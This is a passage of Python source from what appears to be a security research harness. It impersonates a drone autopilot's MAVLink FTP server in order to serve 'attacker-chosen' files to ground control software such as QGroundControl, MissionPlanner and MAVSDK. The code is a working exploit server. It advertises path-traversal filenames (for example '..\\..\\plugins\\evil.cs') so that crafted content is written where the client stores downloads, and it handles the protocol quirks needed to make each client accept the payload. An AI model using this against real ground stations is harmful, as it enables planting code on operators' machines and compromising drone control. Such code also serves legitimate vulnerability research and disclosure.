    # ----------------------------------------------------------------------
    # The GCS is the FTP *client*; we are the *server*. We answer ListDirectory,
    # OpenFileRO, ReadFile and the BurstReadFile path with attacker-chosen
    # filenames and contents. Wire format mirrors GCS_FTP.cpp / MAVFtp.cs:
    #   payload[0:2]=seq(LE16) [2]=session [3]=opcode [4]=size [5]=req_opcode
    #   [6]=burst_complete [7]=pad [8:12]=offset(LE32) [12:]=data
    # ======================================================================
    PAYLOAD_LEN = 251
    HDR = 12
    MAX_DATA = PAYLOAD_LEN - HDR        # 239 data bytes
    # opcodes (FTP_OP)
    OP_NONE = 0
    OP_TERMINATE = 1
    OP_RESET = 2
    OP_LIST = 3
    OP_OPEN_RO = 4
    OP_READ = 5
    OP_OPEN_WO = 6
    OP_BURST_READ = 15
    OP_LIST_WITH_TIME = 16   # kCmdListDirectoryWithTime -- newer opcode QGC Daily
                             # probes FIRST on every listDirectory() call (FTPManager.cc);
                             # it only falls back to plain OP_LIST if we NACK this
                             # specific request with ERR_UNKNOWN_COMMAND (see below).
    OP_ACK = 128
    OP_NACK = 129
    # NACK error codes
    ERR_FAIL = 1
    ERR_EOF = 6
    ERR_UNKNOWN_COMMAND = 7
    ERR_FILE_NOT_FOUND = 10

    def add_ftp_file(self, name, content):
        """Register a file the FTP server will serve. `name` may contain traversal
        ('..\\..\\plugins\\evil.cs') or be absolute — that is the whole point."""
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.ftp_files[name] = content

    def add_ftp_dir_entry(self, name, size=None, is_dir=False, mtime=None):
        """Add an entry to what ListDirectory returns. `name` may be a traversal/abs path."""
        if size is None:
            size = len(self.ftp_files.get(name, b""))
        self.ftp_dir_entries.append((name, size, is_dir))
        if not hasattr(self, "ftp_dir_mtimes"):
            self.ftp_dir_mtimes = {}
        if mtime is not None:
            self.ftp_dir_mtimes[name] = int(mtime)

    def _ftp_reply(self, req, opcode, size=0, req_opcode=0, burst=0, offset=0,
                   data=b"", session=None, seq=None):
        p = bytearray(self.PAYLOAD_LEN)
        # ACK seq defaults to req seq + 1. A multi-chunk BurstReadFile MUST
        # increment per chunk: QGC drops any ack whose seqNumber is below
        # _expectedIncomingSeqNumber and advances that after every non-final
        # chunk. Re-using one seq delivers only the first 239 bytes -- invisible
        # on a tiny file, fatal on a multi-megabyte log.
        seq_val = (req["seq"] + 1) if seq is None else seq
        struct.pack_into("<H", p, 0, seq_val & 0xFFFF)
        # OpenFileRO must hand the client a NEW session id in the ACK header; for
        # all other replies we echo the request's session.
        p[2] = (req["session"] if session is None else session) & 0xFF
        p[3] = opcode & 0xFF
        p[4] = size & 0xFF
        p[5] = req_opcode & 0xFF
        p[6] = burst & 0xFF
        struct.pack_into("<I", p, 8, offset & 0xFFFFFFFF)
        d = data[:self.MAX_DATA]
        p[self.HDR:self.HDR + len(d)] = d
        as_comp = req.get("target_comp", self.compid)
        with self._send_lock:
            old = self.master.mav.srcComponent
            self.master.mav.srcComponent = as_comp
            try:
                self.master.mav.file_transfer_protocol_send(
                    0, req["src_sys"], req["src_comp"], list(p))
            finally:
                self.master.mav.srcComponent = old

    def _handle_ftp(self, msg):
        raw = bytes(bytearray(msg.payload))
        req = {
            "seq": struct.unpack_from("<H", raw, 0)[0],
            "session": raw[2],
            "opcode": raw[3],
            "size": raw[4],
            "req_opcode": raw[5],
            "burst": raw[6],
            "offset": struct.unpack_from("<I", raw, 8)[0],
            "data": raw[self.HDR:self.HDR + raw[4]],
            "src_sys": msg.get_srcSystem(),
            "src_comp": msg.get_srcComponent(),
            # FTPManager::_mavlinkMessageReceived drops any reply whose compid is
            # not _ftpCompId -- and _ftpCompId is whichever component the request
            # was addressed to (the camera's 100 for a cam_definition fetch, 1 for
            # @PARAM/param.pck). Reply as that component or the ACK is discarded
            # and the download silently times out.
            "target_comp": getattr(msg, "target_component", self.compid),
        }
        op = req["opcode"]
        if self.trace:
            observe("MAVFTP request: opcode=%d size=%d offset=%d data=%r"
                    % (op, req["size"], req["offset"], req["data"]))

        if op == self.OP_LIST:
            self._ftp_list(req)
        elif op == self.OP_OPEN_RO:
            self._ftp_open_ro(req)
        elif op == self.OP_READ:
            self._ftp_read(req, burst=False)
        elif op == self.OP_BURST_READ:
            self._ftp_read(req, burst=True)
        elif op == self.OP_TERMINATE or op == self.OP_RESET:
            self._ftp_sessions.pop(req["session"], None)
            self._ftp_reply(req, self.OP_ACK, req_opcode=op)
        elif op == self.OP_LIST_WITH_TIME:
            # QGC-04 REQUIRES this opcode to be answered. If we NACK it,
            # FTPManager sets listDirectoryWithTimeUnsupported() and
            # OnboardLogController::_ftpFinishListing() then DISCARDS every entry
            # we just served and falls back to the message-based LOG_ENTRY/LOG_DATA
            # transport (OnboardLogController.cc:1122-1128) -- which this harness
            # does not implement, so the log list renders empty. Answer it with
            # the 3-field form "F<name>\t<size>\t<mtime>".
            self._ftp_list(req, with_time=True)
        else:
            # Any other opcode we don't implement: NACK as "unknown command"
            # (not a generic FAIL) so a client that probes for optional/newer
            # opcodes falls back correctly instead of treating it as a hard error.
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=op,
                            data=bytes([self.ERR_UNKNOWN_COMMAND]))

    def _ftp_list(self, req, with_time=False):
        """ListDirectory: each entry is a type byte ('F'/'D'/'S') then a NUL-
        terminated string. For a file MissionPlanner expects 'name\\tsize'
        (MAVFtp.cs:1310-1321 tab-split). We pack as many entries as fit from the
        requested offset; EOF -> NACK(EndOfFile)."""
        offset = req["offset"]
        if offset >= len(self.ftp_dir_entries):
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=req["opcode"],
                            data=bytes([self.ERR_EOF]))
            return
        blob = b""
        i = offset
        while i < len(self.ftp_dir_entries):
            name, size, is_dir = self.ftp_dir_entries[i]
            if is_dir:
                entry = b"D" + name.encode("utf-8") + b"\x00"
            else:
                if with_time:
                    # kCmdListDirectoryWithTime: name \t size \t mtime(unix secs UTC)
                    mtime = self.ftp_dir_mtimes.get(name, 0)
                    entry = b"F" + ("%s\t%d\t%d" % (name, size, mtime)).encode("utf-8") + b"\x00"
                else:
                    entry = b"F" + ("%s\t%d" % (name, size)).encode("utf-8") + b"\x00"
            if len(blob) + len(entry) > self.MAX_DATA:
                break
            blob += entry
            i += 1
        self._ftp_reply(req, self.OP_ACK, size=len(blob), req_opcode=req["opcode"],
                        offset=offset, data=blob)
        if self.verbose:
            attack("served MAVFTP ListDirectory: %d entr%s (offset %d) incl. attacker filenames"
                   % (i - offset, "y" if i - offset == 1 else "ies", offset))

    def _resolve_ftp_file(self, path_bytes):
        """Map an OpenFileRO path back to a registered attacker file.

        The GCS requests whatever we advertised in ListDirectory, but prefixed
        with the directory it listed -- e.g. we advertise "00000042.BIN" and QGC
        asks for "@MAV_LOG/00000042.BIN". So the requested path can be LONGER
        than the registered key, and a one-directional endswith() test fails.
        Try, in order: exact, basename-vs-basename, key endswith request,
        request endswith key, then a single-file fallback.
        """
        path = path_bytes.decode("utf-8", "replace").lstrip("/").rstrip("\x00")
        # QGC requests "@PARAM/param.pck?withdefaults=1" -- the query string must
        # not defeat basename matching, or the single-file fallback answers the
        # parameter download with whatever else we happen to be serving.
        if "?" in path:
            path = path.split("?", 1)[0]
        norm = lambda p: p.lstrip("/").replace("\\", "/")
        base = lambda p: norm(p).rsplit("/", 1)[-1]

        if path in self.ftp_files:
            return path, self.ftp_files[path]

        # basename match -- the normal case for a listed directory
        pb = base(path)
        for k, v in self.ftp_files.items():
            if base(k) == pb:
                return k, v

        # either direction of suffix match (traversal names, nested dirs)
        for k, v in self.ftp_files.items():
            if norm(k).endswith(norm(path)) or norm(path).endswith(norm(k)):
                return k, v

        if len(self.ftp_files) == 1:
            k = next(iter(self.ftp_files))
            return k, self.ftp_files[k]

        warn("OpenFileRO for %r matched no registered file (have: %s)"
             % (path, ", ".join(sorted(self.ftp_files))))
        return None, None

    def _ftp_open_ro(self, req):
        name, content = self._resolve_ftp_file(req["data"])
        if content is None:
            self._ftp_reply(req, self.OP_NACK, size=1, req_opcode=self.OP_OPEN_RO,
                            data=bytes([self.ERR_FILE_NOT_FOUND]))
            return
        session = (max(self._ftp_sessions) + 1) if self._ftp_sessions else 1
        self._ftp_sessions[session] = (name, content)
        # ACK header carries the new session id; ACK data = file size (LE32),
        # matching GCS_FTP.cpp OpenFileRO which returns the size in the payload.
        self._ftp_reply(req, self.OP_ACK, size=4, req_opcode=self.OP_OPEN_RO,
                        data=struct.pack("<I", len(content)), session=session)
        if self.verbose:
            attack("served MAVFTP OpenFileRO -> session=%d, %d bytes of attacker content"
                   % (session, len(content)))

    def _ftp_session_lookup(self, req):
        """Resolve the session for a request, tolerantly.

        MAVSDK never picks up the session id we return in the OpenFileRO ack --
        `_session` is only ever written into outgoing payloads (v3.17.4
        mavlink_ftp_client.cpp:427/478/525/713), never assigned from a reply -- so
        it keeps sending session 0. A strict server NAKs that, MAVSDK maps the NAK
        to ProtocolError and gives up. Real autopilot FTP servers are lenient here,
        so we are too: fall back to the only open session when the id does not
        match. (Deviation from the MAVLink FTP spec on MAVSDK's side, not a
        vulnerability -- noted in the write-up.)
        """
        sess = self._ftp_sessions.get(req["session"])
        if sess is None and self._ftp_sessions:
            # Fall back to the MOST RECENT session, not "the only one". Across
            # several connects the dict holds stale sessions, and requiring
            # exactly one silently NAKed every download after the first -- which
            # looked like MAVSDK declining to re-download, and was not.
            sess = self._ftp_sessions[max(self._ftp_sessions)]
        return sess

    def _ftp_read(self, req, burst):
        sess = self._ftp_session_lookup(req)
        if sess is None:
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_FAIL]))
            return
        _name, content = sess
        offset = req["offset"]
        if offset >= len(content):
            self._ftp_reply(req, self.OP_NACK, size=1,
                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_EOF]))
            return
        if not burst:
            chunk = content[offset:offset + min(req["size"] or self.MAX_DATA, self.MAX_DATA)]
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_READ,
                            offset=offset, data=chunk)
            return
        # Burst path: stream chunks until EOF, marking burst_complete on the last.
        pos = offset
        seq = req["seq"] + 1
        while pos < len(content):
            chunk = content[pos:pos + self.MAX_DATA]
            pos += len(chunk)
            last = pos >= len(content)
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_BURST_READ,
                            burst=1 if last else 0, offset=pos - len(chunk), data=chunk,
                            seq=seq)
            seq = (seq + 1) & 0xFFFF
        if self.verbose:
            attack("served MAVFTP BurstReadFile: %d bytes from offset %d" % (len(content) - offset, offset))


